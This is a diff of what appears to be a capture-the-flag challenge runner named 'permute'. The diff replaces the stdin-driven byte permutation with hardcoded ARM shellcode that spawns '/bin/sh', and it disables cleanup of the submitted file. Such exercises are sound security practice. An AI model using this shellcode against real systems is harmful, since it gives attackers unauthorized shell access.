@@ -4,18 +4,20 @@ import fcntl
 import os
 import sys
 import time
-import subprocess32 as subprocess
+import subprocess
 
-os.chdir("/home/problem/permute")
+# os.chdir("/home/problem/permute")
 
 buf = map(chr, range(256))
-
-while 1:
-    a,b = map(ord, sys.stdin.read(2))
-    if a == b:
-        break
-    buf[a], buf[b] = buf[b], buf[a]
-
+buf="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x49\x1a\x0a\x1c\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
+# while 1:
+#     a,b = map(ord, sys.stdin.read(2))
+#     print "a was: %s"%a
+#     print "b was: %s"%b
+#     if a == b:
+#         break
+#     buf[a], buf[b] = buf[b], buf[a]
+    # print buf
 from struct import pack
 
 fn = 'submit/%d' % os.getpid()
@@ -52,11 +54,12 @@ os.close(fd)
 try:
     p = subprocess.Popen(['/usr/bin/setsid', '/usr/bin/sudo', '-u', 'nobody', fn])
     p.wait(timeout=60)
-except subprocess.TimeoutExpired:
+except:
     print "Timeout"
     os.killpg(p.pid, 9)
     p.wait()
-except:
-    print "Sorry, submission execution failed."
-finally:
-    os.unlink(fn)
+# except:
+#     print "Sorry, submission execution failed."
+# finally:
+# 	print "derp"
+#     # os.unlink(fn)
